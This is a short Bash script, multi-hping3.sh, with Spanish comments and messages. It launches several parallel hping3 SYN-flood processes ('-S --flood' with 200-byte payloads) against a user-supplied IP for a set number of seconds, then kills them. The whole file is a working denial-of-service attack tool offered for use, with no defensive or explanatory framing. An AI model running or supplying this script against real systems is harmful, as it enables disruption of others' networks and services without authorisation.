#!/bin/bash

#Colores
verde="\e[0;32m\033[1m"
rojo="\e[0;31m\033[1m"
azul="\e[0;34m\033[1m"
amarillo="\e[0;33m\033[1m"
morado="\e[0;35m\033[1m"
turquesa="\e[0;36m\033[1m"
gris="\e[0;37m\033[1m"
fin="\033[0m\e[0m"

i=1
e=1
o=$2
((o++))

#Ayuda
if [[ $1 == "" ]]; then
	echo -e "${amarillo}Usage: sudo multi-hping3.sh <IP> <Number of attacks> <Time (Seconds)>${fin}"
	exit
elif [[ $1 == "-h" ]]; then
	echo -e "${amarillo}Usage: sudo multi-hping3.sh <IP> <Number of attacks> <Time (Seconds)>${fin}"
	exit
fi


while [ $i -lt $o ]
do
	sudo hping3 -d 200 -S --flood $1 & 
	echo -e "${amarillo}Atacando${fin} ${turquesa}$1${fin} ${amarillo}Numero de ataque${fin} ${turquesa}$i${fin}"
	sleep 1
	((i++))
done

echo -e "${rojo}Atacando...${fin} ${turquesa}$3${fin} ${rojo}segundos.${fin}"
sleep $3
sudo killall hping3 & 
echo -e "${amarillo}Ataque finalizado...${fin}"
exit
